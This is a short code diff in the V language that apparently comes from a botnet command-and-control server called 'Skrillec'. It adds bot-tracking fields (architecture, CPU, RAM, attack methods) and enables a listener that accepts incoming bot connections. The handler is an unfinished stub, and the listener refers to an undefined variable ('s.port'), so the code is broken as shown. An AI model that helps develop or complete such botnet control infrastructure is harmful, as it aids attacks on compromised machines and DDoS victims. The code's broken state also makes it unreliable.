@@ -52,7 +52,7 @@ pub struct Bots {
 		bot_arch		[]string
 		bot_cpu			[]string
 		bot_ram			[]string
-		bot_methods		[]string = ["", ""]
+		bot_methods		[]string
 }
 
 pub fn (mut s Server) set_port(port string) {
@@ -147,17 +147,17 @@ pub fn (mut c Clients) get_username(mut socket net.TcpConn) string {
 *								BOT FUNCTIONS
 *
 *****************************************************************************************************/
-// pub fn start_skrillec_bot(mut svr server.Server) {
-// 	mut bot_svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
-// 	for {
-// 		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
-// 		bot_socket.set_read_timeout(time.infinite)
-// 		go svr.bots.bot_conn_handler(mut bot_socket, mut &svr)
-// 	}
-// }
+pub fn start_skrillec_bot(mut svr server.Server) {
+	mut bot_svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
+	for {
+		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
+		bot_socket.set_read_timeout(time.infinite)
+		go svr.bots.bot_conn_handler(mut bot_socket, mut &svr)
+	}
+}
 
-// pub fn (mut b Bots) bot_conn_handler(mut bot_socket net.TcpConn, mut svr server.Server) {
-// 	mut user_ip := bot_socket.peer_addr() or { return }
-// 	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
-// 	mut fixed_port := "$user_ip".split("]:")[1]
-// }
+pub fn (mut b Bots) bot_conn_handler(mut bot_socket net.TcpConn, mut svr server.Server) {
+	mut user_ip := bot_socket.peer_addr() or { return }
+	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
+	mut fixed_port := "$user_ip".split("]:")[1]
+}
